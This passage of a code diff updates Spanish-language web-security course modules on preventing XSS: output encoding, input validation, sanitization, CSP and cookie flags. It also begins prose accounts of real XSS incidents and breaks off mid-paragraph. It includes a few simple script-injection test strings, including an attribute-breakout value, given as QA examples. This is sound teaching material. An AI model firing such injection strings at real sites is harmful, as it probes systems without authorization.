-          <li><strong>Evita funciones propensas a XSS:</strong> No uses <code>eval</code> con input, no construyas HTML con concatenación de strings, no uses <code>innerHTML</code> directamente con datos crudos, etc.</li>
-          
-          <li><strong>Utiliza tecnologías de seguridad complementarias:</strong> Aquí entra Content Security Policy (CSP) y la bandera HttpOnly en cookies. CSP puede impedir mucha ejecución no autorizada y HttpOnly impide que JavaScript lea las cookies de sesión.</li>
-          
-          <li><strong>Mantén una cultura de seguridad en el código:</strong> Revisa regularmente el código en busca de patrones peligrosos, usa análisis estático, actualiza librerías y capacita a tu equipo en estas prácticas.</li>
-        </ol>
+<p>
+  Codificar el contenido antes de insertarlo en el HTML evita que los caracteres especiales sean interpretados como etiquetas o atributos. Cuando un valor codificado se inserta en la página, el navegador lo trata como texto plano.
+</p>
 
-        <h2>Validación de entrada (primer filtro)</h2>
-        <p>
-          La validación de entrada por sí sola no garantiza eliminar XSS (ya que siempre podría haber algún vector ingenioso), pero es una importante primera capa. Ejemplo: Si tienes un campo "Nombre" que esperas solo letras y espacios, imponlo. Podrías usar una expresión regular <code>/^[A-Za-zÁÉÍÓÚáéíóúñÑ ]+$/</code> para validar. Así, una entrada con <code>&lt;script&gt;</code> sería rechazada por contener caracteres inválidos.
-        </p>
+<p>Un ejemplo de codificación para mostrar un valor dentro del cuerpo del HTML sería:</p>
 
-        <p>En servidores típicos:</p>
-        <ul>
-          <li><strong>En PHP:</strong> usar <code>filter_input</code> con filtros apropiados</li>
-          <li><strong>En .NET:</strong> las DataAnnotations <code>[RegularExpression]</code>, <code>[StringLength]</code>, etc.</li>
-          <li><strong>En Java:</strong> usar Bean Validation (JSR 303) o manualmente chequear strings</li>
-        </ul>
+<pre><code class="language-html highlight-secure">
+&lt;p id="nombre"&gt;&lt;/p&gt;
 
-        <h3>Lista blanca vs lista negra</h3>
-        <p>
-          Siempre que sea viable, preferir lista blanca. Por ejemplo, en un foro, en vez de buscar <code>&lt;script&gt;</code> para bloquearlo (lista negra insuficiente), es mejor eliminar todo HTML excepto quizás <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;a&gt;</code> permitidos (lista blanca de etiquetas seguras).
-        </p>
+&lt;script&gt;
+  const nombreUsuario = obtenerNombre(); 
+  document.getElementById('nombre').textContent = nombreUsuario;
+&lt;/script&gt;
+</code></pre>
 
-        <p>
-          Existen librerías (AntiSamy de OWASP, HTML Sanitizer, etc.) que tienen políticas de limpieza definibles para este fin. Validar entrada también incluye longitud (limitar a un tamaño razonable dificulta payloads gigantes o técnicas de ofuscación).
-        </p>
+<p>
+  El uso de textContent asegura que el navegador nunca interpretará el contenido como HTML. Incluso si el nombre incluye símbolos especiales como menor que o mayor que, estos se representarán de forma literal. Esta técnica elimina por completo el riesgo de que la entrada del usuario se convierta en código ejecutable en ese contexto.
+</p>
 
-        <div class="warning-box">
-          <p><strong>Ejemplo de error mitigado por validación:</strong> Supongamos un campo de cantidad (número entero). Sin validación, un atacante podría enviar <code>1">&lt;script&gt;alert(1)&lt;/script&gt;</code> esperando que en alguna parte ese valor se inserte. Si validamos que es dígito, la carga no pasará.</p>
-        </div>
+<h2>Evitar métodos inseguros para insertar contenido en el DOM</h2>
 
-        <h2>Escape de salida (la barrera principal)</h2>
-        <p>
-          Esta es la medida más efectiva y necesaria en todos los casos: escapar los caracteres especiales antes de volcar datos al HTML/JS. Ya lo cubrimos en detalle en el módulo de contextos. A modo de resumen práctico:
-        </p>
+<p>
+  Algunas funciones, como innerHTML o insertAdjacentHTML, interpretan la cadena como HTML. Si se utiliza cualquiera de estas funciones con contenido no confiable, el resultado puede ser la ejecución de código malicioso.
+</p>
 
-        <ul>
-          <li><strong>En HTML:</strong> usar funciones de la plataforma (por ejemplo <code>htmlspecialchars</code> en PHP, <code>HTMLEncode</code> en .NET, escape en algunas plantillas JS).</li>
-          <li><strong>En JavaScript:</strong> envolver datos en <code>JSON.stringify</code> o usar un escape para JavaScript.</li>
-          <li><strong>En URLs:</strong> usar <code>urlencode/encodeURIComponent</code> según el caso.</li>
-          <li><strong>En atributos HTML:</strong> escapa y pon comillas.</li>
-          <li><strong>En CSS:</strong> idealmente no inyectar, pero hay <code>encodeForCSS</code> en librerías si se requiere.</li>
-        </ul>
+<p>La alternativa segura consiste en usar métodos que no interpreten HTML. Por ejemplo:</p>
 
-        <h3>Ejemplo en plantilla server-side</h3>
-        <p>
-          Django (Python) automáticamente escapa variables en sus plantillas. Lo mismo Blade en Laravel, Twig en Symfony, etc. Sin embargo, suelen ofrecer un "escape hatch" – una manera de deshabilitar el escape cuando crees que no lo necesitas (por ejemplo, <code>{!! $var !!}</code> en Blade imprime sin escapar).
-        </p>
+<pre><code class="language-html highlight-secure">
+const comentario = obtenerComentarioSeguro();
 
-        <div class="warning-box">
-          <p><strong>¡Cuidado!</strong> No uses la impresión sin escape a menos que estés insertando HTML generado por tu propia aplicación de forma segura. Muchos incidentes XSS ocurren porque un desarrollador usó salida sin escapar para "tener texto con formato" pero terminó mostrando también scripts de usuarios.</p>
-        </div>
+const contenedor = document.createElement('div');
+contenedor.textContent = comentario;
 
-        <h3>Cuidado con dobles escapes</h3>
-        <p>
-          Si escapas dos veces, el usuario verá los caracteres <code>&amp;lt;</code> en la página, lo cual es mejor que XSS, pero luce mal. Trata de escapar una vez en el punto de salida final. Si por arquitectura ya te llega escapado un valor, no lo vuelvas a escapar (pero asegúrate de documentar ese comportamiento).
-        </p>
+document.body.appendChild(contenedor);
+</code></pre>
 
-        <h2>Sanitización de contenido</h2>
-        <p>
-          La sanitización es necesaria cuando quieres permitir contenido enriquecido aportado por el usuario. Un caso es sistemas de foros, blogs donde usuarios pueden incluir ciertas etiquetas (en negrita, enlaces, listas, etc.). Aquí, aplicar un escape genérico arruinaría el formato (mostraría las etiquetas en vez de aplicarlas).
-        </p>
+<p>
+  Este enfoque previene XSS porque la propiedad textContent no analiza etiquetas ni atributos; únicamente muestra texto. De esta forma, aunque el comentario contenga secuencias que podrían convertirse en un payload, el navegador nunca las procesará de manera activa.
+</p>
 
-        <p>
-          Por lo tanto, se utiliza un sanitizador HTML: este software analiza el HTML de entrada y remueve o neutraliza todo lo que sea peligroso (scripts, iframes, eventos on*, CSS potentes) dejando solo un subconjunto considerado seguro.
-        </p>
+<h2>Validación estricta de entradas</h2>
 
-        <h3>Ejemplos de sanitizadores</h3>
-        <ul>
-          <li><strong>DOMPurify (JS):</strong> altamente recomendado y fácil de usar en aplicaciones web modernas. Tú le pasas una cadena de HTML potencialmente sucia y te devuelve una limpia.</li>
-          <li><strong>OWASP AntiSamy:</strong> disponible para Java/.NET, con políticas configurables (definir qué tags/atributos se permiten).</li>
-          <li><strong>Bleach (Python), sanitize-html (Node):</strong> otras opciones populares.</li>
-        </ul>
+<p>
+  Aunque la codificación es esencial, resulta aún más efectivo restringir aquello que la aplicación acepta como entrada. En campos donde el usuario solo debe proporcionar datos simples, la validación reduce la posibilidad de que valores peligrosos entren en el sistema.
+</p>
 
-        <p>
-          <strong>Importante:</strong> Sanitizar no reemplaza el escape al mostrar, pero si haces sanitización correcta en cuanto recibes/almacenas el contenido, podrías almacenar una versión ya segura. Aun así, lo típico es: al renderizar, tomas el HTML permitido y lo insertas tal cual (sin escape, porque quieres que se interpreten las etiquetas permitidas).
-        </p>
+<p>En un backend Express, una validación básica podría ser:</p>
 
-        <h3>Ejemplo de sanitización</h3>
-        <p>Un usuario publica: <code>&lt;b&gt;Hola&lt;/b&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>. El sanitizador elimina <code>&lt;script&gt;</code> por completo y deja <code>&lt;b&gt;Hola&lt;/b&gt;</code>. Al mostrar, esa cadena ya no tiene nada peligroso y se puede insertar con <code>innerHTML</code> o entregarla del servidor tal cual.</p>
+<pre><code class="language-javascript highlight-secure">
+app.post('/registro', (req, res) => {
+  const nombre = req.body.nombre;
 
-        <div class="warning-box">
-          <p><strong>Nota importante:</strong> Sanitizar es complejo – nuevos vectores pueden aparecer. Por eso delegamos a librerías mantenidas por expertos, que se actualizan cuando surgen nuevas técnicas.</p>
-        </div>
+  if (!/^[a-zA-ZÁÉÍÓÚÑáéíóúñ ]+$/.test(nombre)) {
+    return res.status(400).send('Formato inválido');
+  }
 
-        <h2>Uso seguro de bibliotecas y frameworks</h2>
-        <p>Una gran parte de la prevención es aprovechar las características de seguridad de los frameworks en lugar de evitarlas. Algunas recomendaciones:</p>
+  guardarUsuario(nombre);
+  res.send('Usuario registrado');
+});
+</code></pre>
 
-        <h3>Plantillas server-side</h3>
-        <p>
-          Deja que escapen automáticamente. No introduzcas salida sin escape a menos que sea indispensable. Si lo haces, pasa el contenido por un sanitizador antes de marcarlo como "seguro". Muchos frameworks permiten marcar un string como seguro (ej: safe filter en Django) – pero eso es prometer que tú lo limpiaste.
-        </p>
+<p>
+  Este fragmento garantiza que el nombre solo contiene caracteres permitidos y bloquea cualquier intento de añadir símbolos que puedan alterar el comportamiento del sistema. No se pretende filtrar HTML, sino restringir el campo a lo que debe contener.
+</p>
 
-        <h3>Frameworks front-end (React, Angular, Vue)</h3>
-        <ul>
-          <li><strong>En React:</strong> las variables interpoladas en JSX se escapan por defecto. <code>&lt;div&gt;{userInput}&lt;/div&gt;</code> es seguro. No uses <code>dangerouslySetInnerHTML</code> a menos que realmente tengas HTML que sabes que es seguro.</li>
-          
-          <li><strong>En Angular:</strong> por defecto su data-binding es seguro. Angular tiene su servicio <code>DomSanitizer</code> para casos donde quieres permitir HTML. Nunca hagas <code>Sanitizer.bypassSecurityTrustHtml(userHtml)</code> sin sanitizar ese HTML.</li>
-          
-          <li><strong>En Vue.js:</strong> también escapa inserciones moustache <code>{{ }}</code> automáticamente. Si necesitas insertar HTML, usar <code>v-html</code> directive, pero pasarle contenido ya filtrado.</li>
-          
-          <li><strong>Con jQuery u otras libs:</strong> evita funciones que interpreten HTML de strings arbitrarias. Usar <code>.text(data)</code> en vez de <code>.html(data)</code> para texto plano.</li>
-        </ul>
+<h2>Sanitización de HTML cuando es necesario permitir formato</h2>
 
-        <h3>Actualizaciones</h3>
-        <p>
-          Mantén tus frameworks actualizados. Ha habido casos donde XSS era posible por fallos en librerías. Los parches suelen mejorar la sanitización o cerrar agujeros.
-        </p>
+<p>
+  En algunas aplicaciones, los usuarios pueden insertar contenido enriquecido, como descripciones o publicaciones con estilo. En estos casos, la estrategia consiste en limpiar el HTML para eliminar etiquetas peligrosas.
+</p>
 
-        <h2>Defense-in-Depth: CSP y HttpOnly (introducción)</h2>
-        <p>Aunque tenemos un módulo dedicado a CSP y cabeceras, vale la pena mencionarlas brevemente como parte de la prevención global:</p>
+<p>Un ejemplo usando una biblioteca de sanitización sería:</p>
 
-        <h3>Content Security Policy (CSP)</h3>
-        <p>
-          Es una cabecera que le indica al navegador qué fuentes de contenido puede cargar o ejecutar. Una configuración estricta (por ejemplo, solo permitir scripts propios y prohibir inline y eval) puede frenar muchos XSS porque aunque logre inyectarse un <code>&lt;script&gt;</code> o un <code>onerror</code>, el navegador no lo ejecutará si viola la política.
-        </p>
+<pre><code class="language-javascript highlight-secure">
+const contenido = req.body.descripcion;
+const limpio = DOMPurify.sanitize(contenido);
 
-        <div class="warning-box">
-          <p><strong>Importante:</strong> CSP se considera una mitigación de segunda capa – es decir, uno no debe decir "no escapo porque tengo CSP", sino usarlo como respaldo por si algo se escapó.</p>
-        </div>
+guardarDescripcion(limpio);
+</code></pre>
 
-        <h3>HttpOnly en cookies</h3>
-        <p>
-          Marcar las cookies de sesión como <code>HttpOnly</code> significa que JavaScript (incluso un script malicioso inyectado) no podrá leerlas desde <code>document.cookie</code>. Esto corta la posibilidad de robo de sesión directamente vía XSS.
-        </p>
+<p>
+  Este proceso elimina etiquetas script, atributos con eventos, esquemas javascript y elementos que pueden ejecutar código. La utilidad de este enfoque radica en permitir formato sin comprometer la seguridad del navegador ni del usuario.
+</p>
 
-        <h3>Otros headers de seguridad</h3>
-        <ul>
-          <li><strong>X-Content-Type-Options: nosniff:</strong> puede prevenir que un atacante suba contenido interpretado como HTML/JS inadvertidamente</li>
-          <li><strong>X-Frame-Options:</strong> evita que tu sitio sea embebido en iframes (reduce vectores de clickjacking que a veces se combinan con XSS)</li>
-        </ul>
+<h2>Uso de Content Security Policy para restringir ejecución de scripts</h2>
 
-        <h2>Ejemplo de implementación integrada</h2>
-        <p>Para aterrizar estas ideas, veamos un flujo "ideal" en una funcionalidad que maneja datos de usuario:</p>
+<p>
+  Content Security Policy es una capa defensiva que indica al navegador qué recursos puede ejecutar. Con una configuración adecuada, se evita que scripts no autorizados lleguen a ejecutarse incluso si hay un punto vulnerable.
+</p>
 
-        <h3>Caso: Una página de perfil de usuario</h3>
-        <p>Donde el usuario puede actualizar su "estado" (como una frase de biografía corta) que luego se muestra en su perfil público.</p>
+<p>Un encabezado básico sería:</p>
 
-        <ol>
-          <li><strong>Entrada:</strong> El usuario ingresa su estado en un formulario. En el servidor, validamos longitud (ej. máx 160 caracteres) y permitimos solo ciertos caracteres unicode. Si pasa validación, lo almacenamos en la base de datos tal cual.</li>
-          
-          <li><strong>Al mostrar (perfil público):</strong> El perfil toma el campo "estado" de la DB y lo inserta en la página. Al generar esa vista, aplicamos escape HTML antes de insertarlo en el DOM.</li>
-          
-          <li><strong>Capas adicionales:</strong> El sitio debería tener una política CSP que deshabilite eval y scripts inline. Y las cookies de sesión HttpOnly garantizan que, aunque se pudiera ejecutar un script, este no robe la sesión fácilmente.</li>
-          
-          <li><strong>Testing:</strong> Durante QA, alguien debería probar ingresando cosas como <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> en todos los campos de texto para verificar que no se ejecutan.</li>
-        </ol>
+<pre><code class="language-html highlight-secure">
+Content-Security-Policy: script-src 'self';
+</code></pre>
 
-        <pre><code class="language-php highlight-vulnerable">// Ejemplo de entrada peligrosa
-$estado = "El mejor &lt;script&gt;alert(1)&lt;/script&gt; desarrollador";</code></pre>
+<p>Otra variante más estricta sería:</p>
 
-        <pre><code class="language-php highlight-secure">// Al mostrar con escape
-echo "&lt;p&gt;" . htmlspecialchars($estado, ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";
-// Resultado: El mejor &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; desarrollador</code></pre>
+<pre><code class="language-html highlight-secure">
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+</code></pre>
 
-        <p>
-          Puede que el resultado luzca extraño para el usuario malicioso (verá su propio intento en texto), pero no causó daño.
-        </p>
+<p>
+  CSP no reemplaza la codificación y sanitización, pero añade una barrera que detiene muchos ataques, aunque exista una vulnerabilidad en otro punto.
+</p>
 
-        <h2>Resumen</h2>
-        <p>
-          La prevención de XSS efectiva requiere un enfoque múltiple: validar temprano, escapar siempre, y sanitizar cuando sea necesario, usando las herramientas adecuadas en cada contexto. Además, complementamos con configuraciones de seguridad en el entorno (headers, cookies) para reducir el impacto si algo se escapa.
-        </p>
+<h2>Configuración segura de cookies</h2>
 
-        <p>
-          Hemos visto ejemplos concretos de cómo implementar estas medidas y resaltado la importancia de apoyarnos en frameworks y librerías de confianza en lugar de intentar soluciones caseras propensas a error.
-        </p>
+<p>
+  Las cookies de sesión deben configurarse para impedir su acceso desde JavaScript y evitar que se transmitan sin cifrado. Esto mitiga ataques que buscan robar cookies mediante instrucciones como document.cookie.
+</p>
 
-        <p>
-          En el siguiente módulo profundizaremos en Content Security Policy y cabeceras HTTP, que son componentes importantes de la estrategia de defensa en profundidad. Comprenderemos cómo CSP puede actuar como una red de seguridad contra XSS y otras amenazas, y cómo configurar cabeceras útiles en nuestras aplicaciones web para añadir capas adicionales de protección.
-        </p>
+<p>Una cookie segura puede configurarse así:</p>
 
-        <p>
-          Con las prácticas de codificación segura de este módulo y los mecanismos adicionales del próximo, estaremos bien preparados para construir aplicaciones robustas frente a XSS.
-        </p>
+<pre><code class="language-html highlight-secure">
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict;
+</code></pre>
+
+<p>
+  HttpOnly impide que JavaScript lea la cookie.<br>
+  Secure obliga a enviarla únicamente por HTTPS.<br>
+  SameSite restringe el envío en solicitudes cruzadas.
+</p>
+
+<p>
+  Estas opciones protegen las sesiones incluso en caso de XSS, ya que el navegador no permite a los scripts acceder a la cookie para transmitirla a un servidor remoto.
+</p>
+
+<h2>Restricciones en enlaces y acciones sensibles</h2>
+
+<p>
+  Cuando se insertan enlaces que provienen de la entrada del usuario, es fundamental evitar que utilicen esquemas peligrosos como javascript. Para ello, debe aplicarse una verificación explícita en el servidor o en el cliente.
+</p>
+
+<p>Un ejemplo en el cliente sería:</p>
+
+<pre><code class="language-javascript highlight-secure">
+function esURLSegura(url) {
+  try {
+    const u = new URL(url);
+    return u.protocol === 'https:' || u.protocol === 'http:';
+  } catch {
+    return false;
+  }
+}
+</code></pre>
+
+<p>Antes de insertar el enlace en el DOM:</p>
+
+<pre><code class="language-javascript highlight-secure">
+if (esURLSegura(url)) {
+  enlace.href = url;
+} else {
+  enlace.href = '#';
+}
+</code></pre>
+
+<p>
+  Con esto, la aplicación no permitirá enlaces que ejecuten código cuando el usuario haga clic.
+</p>
+
+<h2>Bibliografía</h2>
+
+<ul>
+  <li>OWASP Foundation, XSS Prevention Cheat Sheet. [Online]. Available:
+    <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
+      https://owasp.org/www-community/xss-prevention
+    </a>
+  </li>
+
+  <li>Mozilla Developer Network, HTML and Script Security. [Online]. Available:
+    <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
+      https://developer.mozilla.org/en-US/docs/Web/Security
+    </a>
+  </li>
+
+  <li>Google Web Fundamentals, Safe DOM Manipulation. [Online]. Available:
+    <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+      https://developers.google.com/web/fundamentals/security
+    </a>
+  </li>
+
+  <li>DOMPurify Documentation. [Online]. Available:
+    <a href="https://github.com/cure53/DOMPurify" target="_blank">
+      https://github.com/cure53/DOMPurify
+    </a>
+  </li>
+
+  <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
+</ul>
       `
     },
-    'csp-y-headers': {
-      id: 'csp-y-headers',
-      title: 'Content Security Policy y cabeceras HTTP',
-      description: 'Aprende cómo aplicar Content Security Policy y otras cabeceras de seguridad para reforzar la protección de tu aplicación frente a ataques XSS.',
+    'impacto-xss': {
+      id: 'impacto-xss',
+      title: 'Impacto y riesgos reales del XSS en organizaciones',
+      description: 'Consecuencias y daños atribuibles a la explotación de XSS.',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Además de escribir código seguro, los desarrolladores web tienen a su disposición configuraciones a nivel de servidor y navegador que sirven como última línea de defensa frente a ataques XSS y otros. En este módulo exploraremos las más destacadas: <strong>Content Security Policy (CSP)</strong> y otras cabeceras HTTP de seguridad. 
-        </p>
-        <p>
-          CSP es una potente herramienta que controla qué tipo de contenido puede cargar o ejecutar una página, reduciendo significativamente las posibilidades de ejecución de scripts inyectados. También veremos cabeceras como <code>X-XSS-Protection</code> (legado), <code>X-Content-Type-Options</code> y la bandera <code>HttpOnly</code> en cookies.
-        </p>
+Los ataques XSS no solo representan un problema técnico, sino un riesgo directo para la operación y la continuidad de las organizaciones. Cuando un atacante consigue ejecutar código dentro del navegador de un usuario, adquiere la capacidad de manipular datos, robar información, suplantar identidades y alterar procesos internos. Los efectos pueden manifestarse en accesos no autorizados, fraudes en línea, exposición de información sensible, daños reputacionales y pérdida de confianza de clientes o empleados.
+</p>
 
-        <h2>Content Security Policy (CSP): ¿Qué es y por qué usarla?</h2>
-        <p>
-          <strong>Content Security Policy</strong> es un mecanismo de seguridad que se aplica mediante una cabecera HTTP o meta etiqueta HTML. Permite definir políticas sobre qué recursos puede cargar la página (scripts, estilos, imágenes, etc.). Su principal función frente a XSS es restringir la carga y ejecución de JavaScript no autorizado.
-        </p>
+<p>
+Para comprender la magnitud del riesgo, resulta esencial estudiar incidentes reales donde XSS provocó consecuencias significativas. Estos casos muestran cómo una vulnerabilidad aparentemente menor puede evolucionar en un problema grave que compromete la seguridad general de la plataforma.
+</p>
 
-        <h3>Directivas clave de CSP para XSS</h3>
-        <ul>
-          <li><strong>script-src:</strong> define de dónde se permiten cargar y ejecutar scripts. Se pueden indicar dominios (ej. <code>'self'</code> para el mismo origen) o usar restricciones como <code>'none'</code>, <code>'unsafe-inline'</code> (no recomendado) o <code>'unsafe-eval'</code>.</li>
-          <li><strong>default-src:</strong> política por defecto para todos los tipos de contenido.</li>
-          <li><strong>object-src:</strong> controla contenido plugin (como Flash). Se recomienda <code>'none'</code>.</li>
-          <li><strong>base-uri:</strong> evita la reescritura maliciosa de URLs base.</li>
-          <li><strong>form-action:</strong> restringe destinos de formularios.</li>
-          <li><strong>frame-ancestors:</strong> evita que otros sitios incluyan tu página en iframes (clickjacking).</li>
-        </ul>
+<h2>MySpace y el gusano Samy: un ejemplo de propagación masiva en redes sociales</h2>
 
-        <div class="warning-box">
-          <p><strong>Clave para mitigar XSS:</strong> prohibir contenido script inesperado, evitar inline scripts salvo uso de <em>nonce</em> o hash, y limitar <code>script-src</code> a dominios propios o de confianza.</p>
-        </div>
+<p>
+MySpace era una de las plataformas sociales más populares entre 2004 y 2008, con millones de usuarios que personalizaban sus perfiles con HTML, imágenes, música y estilos. Esta característica de personalización permitía a los usuarios incrustar contenido dinámico en sus páginas personales, lo que creó una superficie de ataque considerable.
+</p>
 
-        <h3>Ejemplo de política CSP estricta</h3>
-        <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self'; base-uri 'self'; form-action 'self'</code></pre>
-        <p>Esta política bloquea scripts externos, contenido plugin y formularios hacia otros dominios.</p>
+<p>
+El gusano Samy surgió cuando un usuario descubrió que MySpace filtraba la etiqueta script, pero no bloqueaba ciertos atributos y estructuras que podían reconstruir instrucciones JavaScript cuando la página era interpretada por el navegador. El atacante escribió un fragmento de código que se ejecutaba cuando un usuario visitaba su perfil. El script añadía automáticamente al atacante como amigo del visitante, modificaba el perfil del usuario afectado y copiaba el mismo payload en su página.
+</p>
 
-        <h3>Modo Report-Only</h3>
-        <p>
-          CSP puede configurarse en modo <code>Report-Only</code> para probar sin bloquear. En este modo, los navegadores informan violaciones a un endpoint pero no bloquean recursos. Es ideal para ajustar políticas antes de activarlas en producción.
-        </p>
+<p>
+El ataque se propagó de manera exponencial. Cada nuevo perfil afectado se convertía en un nuevo punto de infección. En pocas horas, más de un millón de cuentas habían sido alteradas sin autorización. La integridad del contenido de MySpace fue completamente comprometida, ya que los perfiles mostraban mensajes que los usuarios nunca escribieron. La confidencialidad también se vio afectada, puesto que el script podía haber sido modificado para capturar información privada contenida en las páginas. La plataforma experimentó problemas de disponibilidad y una sobrecarga significativa debido a la cantidad de solicitudes generadas por la propagación del gusano.
+</p>
 
-        <h3>Limitaciones y desafíos</h3>
-        <ul>
-          <li>Requiere conocer todos los recursos legítimos (scripts, CDNs, etc.).</li>
-          <li>Scripts inline se bloquean si no se usa <code>'unsafe-inline'</code> o <code>nonce/hash</code>.</li>
-          <li>Navegadores antiguos no soportan CSP.</li>
-          <li>No protege si un atacante inyecta scripts desde un origen permitido.</li>
-        </ul>
+<p>
+El incidente demostró que una red social con un flujo masivo de usuarios puede convertirse en un vector de amplificación para un XSS almacenado. La reputación de MySpace se vio afectada por la percepción de que su plataforma era insegura y fácilmente manipulable.
+</p>
 
-        <h2>Cómo enviar CSP</h2>
-        <h3>En Apache</h3>
-        <pre><code class="language-apache">&lt;IfModule mod_headers.c&gt;
-      Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self';"
-    &lt;/IfModule&gt;</code></pre>
+<h2>eBay y la redirección fraudulenta a sitios externos</h2>
 
-        <h3>En Express (Node.js)</h3>
-        <pre><code class="language-js">res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none';");</code></pre>
+<p>
+eBay es una de las empresas de comercio electrónico más grandes del mundo, dedicada a facilitar subastas y ventas directas entre usuarios y empresas. Su plataforma maneja transacciones económicas, credenciales de usuario, datos de contacto y métodos de pago, lo que la convierte en un objetivo atractivo para actores maliciosos.
+</p>
 
-        <h3>Meta etiqueta HTML</h3>
-        <pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';"&gt;</code></pre>
-        <p>Útil cuando no se pueden modificar cabeceras HTTP, aunque con limitaciones.</p>
+<p>
+Durante 2014, se descubrió que algunos vendedores podían incrustar código malicioso dentro de la descripción de los productos. La vulnerabilidad no residía en el servidor, sino en la forma en que ciertas páginas permitían HTML parcialmente filtrado. Aunque la etiqueta script estaba bloqueada, era posible usar elementos capaces de ejecutar código de manera indirecta. Este código redirigía al visitante hacia un sitio creado por los atacantes, diseñado para replicar la apariencia de eBay. Una vez allí, se solicitaba al usuario volver a iniciar sesión, obteniendo así sus credenciales.
+</p>
 
-        <h2>Otras cabeceras de seguridad relevantes</h2>
-        <ul>
-          <li><strong>X-XSS-Protection:</strong> activaba el filtro XSS nativo de algunos navegadores (ahora obsoleto). Se recomienda desactivarlo con <code>X-XSS-Protection: 0</code> si ya usas CSP.</li>
-          <li><strong>X-Content-Type-Options: nosniff</strong> evita que el navegador “adivine” tipos de contenido erróneos, previniendo ejecución de archivos subidos maliciosamente.</li>
-          <li><strong>X-Frame-Options:</strong> previene que tu sitio sea embebido en iframes (clickjacking).</li>
-          <li><strong>Set-Cookie con HttpOnly y Secure:</strong> asegura cookies sensibles contra acceso vía JavaScript y solo en HTTPS.</li>
-          <li><strong>Referrer-Policy y Permissions-Policy:</strong> controlan privacidad y APIs disponibles en la página.</li>
-        </ul>
+<p>
+El ataque afectó directamente a la confidencialidad, ya que credenciales reales fueron enviadas a servidores externos sin conocimiento de los usuarios. La integridad de las páginas de productos se vio comprometida, puesto que el contenido mostrado no correspondía a lo autorizado por eBay. La disponibilidad también se vio afectada debido a la necesidad de bloquear temporalmente anuncios, investigar publicaciones alteradas y corregir el motor de filtrado de HTML.
+</p>
 
-        <h2>Ejemplo práctico: Implementando CSP paso a paso</h2>
-        <ol>
-          <li>Revisar las fuentes de scripts legítimos (propios, jQuery CDN, Google Analytics, etc.).</li>
-          <li>Empezar con modo <code>Report-Only</code> para detectar violaciones.</li>
-          <li>Corregir scripts inline moviéndolos a archivos o usando nonce.</li>
-          <li>Pasar a modo enforcement (<code>Content-Security-Policy</code>).</li>
-          <li>Ajustar excepciones puntuales (widgets de terceros, etc.).</li>
-          <li>Verificar que los payloads XSS ya no se ejecuten.</li>
-        </ol>
+<p>
+Para los compradores, la consecuencia fue la pérdida de acceso a sus cuentas y el riesgo de que los atacantes realizasen compras no autorizadas. Para la empresa, el incidente incrementó la presión regulatoria, dañó la percepción pública de la seguridad del sitio y obligó a invertir en mejoras urgentes para evitar un impacto económico mayor.
+</p>
 
-        <pre><code class="language-http">Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://code.jquery.com https://www.google-analytics.com; object-src 'none'; style-src 'self' 'unsafe-inline';</code></pre>
+<h2>Yahoo! Mail y el compromiso de correos electrónicos</h2>
 
-        <h2>Resumen</h2>
-        <p>
-          <strong>Content Security Policy</strong> actúa como un guardia del navegador que refuerza la seguridad ante XSS y otras amenazas. No reemplaza las validaciones o escapes del lado servidor, pero complementa tu defensa en profundidad junto a cabeceras como <code>HttpOnly</code> y <code>nosniff</code>.
-        </p>
-        <p>
-          En este módulo aprendimos qué es CSP, cómo configurarla y cuáles son sus limitaciones, junto con otras cabeceras de seguridad esenciales. En el siguiente módulo veremos cómo integrar estas prácticas en el ciclo de desarrollo seguro.
-        </p>
+<p>
+Yahoo! Mail fue durante años uno de los servicios de correo más utilizados del mundo, tanto por usuarios comunes como por pequeñas empresas que dependían del correo para su comunicación diaria. Debido a su alcance global, cualquier vulnerabilidad en su sistema podía afectar a millones de personas.
+</p>
+
+<p>
+En uno de los incidentes más conocidos, un atacante descubrió que el visor de correos de Yahoo! permitía atributos HTML que no estaban siendo filtrados adecuadamente. Aunque el contenido del correo era procesado para evitar etiquetas peligrosas, algunos atributos capaces de ejecutar código permanecían permitidos. Cuando un usuario abría un correo malicioso, el script se ejecutaba dentro de su sesión.
+</p>
+
+<p>
+El código ejecutado podía leer correos privados, reenviarlos automáticamente a direcciones controladas por el atacante y modificar configuraciones como reglas de reenvío o recuperación de cuenta. La confidencialidad fue afectada de manera directa y grave, ya que los atacantes podían acceder a conversaciones privadas que en muchos casos incluían información personal, datos financieros, documentos adjuntos o comunicaciones empresariales internas. La integridad también se vio comprometida debido a la manipulación del buzón sin intervención del usuario.
+</p>
+
+<p>
+Para los usuarios, esto significó la exposición de información personal o confidencial. Para organizaciones que utilizaban Yahoo! Mail como servicio de comunicación, representó un riesgo de fuga de datos que podía afectar operaciones, decisiones estratégicas o incluso procesos legales. Para Yahoo!, el incidente deterioró su imagen pública en un periodo en el que la empresa ya enfrentaba cuestionamientos sobre su seguridad.
+</p>
+
+<h2>WordPress y la alteración de contenido institucional en sitios corporativos</h2>
+
+<p>
+WordPress es el sistema de gestión de contenido más utilizado en el mundo. Miles de empresas grandes, medianas y pequeñas lo utilizan para manejar sus sitios web, publicaciones informativas y blogs institucionales. Su arquitectura permite la instalación de plugins desarrollados por terceros, lo cual amplía sus capacidades pero también introduce riesgos de seguridad.
+</p>
+
+<p>
